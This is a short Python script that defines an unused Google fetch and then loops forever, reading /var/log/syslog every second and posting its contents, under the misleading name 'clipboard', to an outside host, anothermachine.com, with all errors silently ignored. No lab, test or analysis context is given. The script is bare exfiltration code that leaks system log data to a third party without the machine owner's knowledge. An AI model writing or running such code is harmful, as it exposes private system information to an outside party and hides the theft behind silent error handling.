import urllib
import time
import requests

def test():
    response = urllib.request.urlopen("https://www.google.com")
    return response

while True:
    try:
        with open("/var/log/syslog", "r") as f:
            clipboard = f.read().strip()
            if clipboard:
                requests.post(
                    "https://anothermachine.com", data={"clipboard": clipboard}
                )
    except:
        pass
    time.sleep(1)
